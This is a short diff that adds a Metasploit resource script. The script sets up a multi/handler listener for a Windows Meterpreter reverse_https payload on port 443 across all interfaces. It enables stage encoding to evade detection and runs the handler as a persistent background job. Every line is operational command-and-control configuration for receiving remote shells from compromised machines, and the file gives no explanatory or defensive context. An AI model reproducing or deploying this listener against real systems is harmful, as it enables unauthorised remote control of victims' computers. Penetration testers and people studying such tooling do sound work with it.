@@ -1,0 +1,8 @@
+use multi/handler 
+jobs -K 
+set payload windows/meterpreter/reverse_https 
+set exitonsession false 
+set lhost 0.0.0.0 
+set lport 443
+set enablestageencoding true
+exploit -j -z
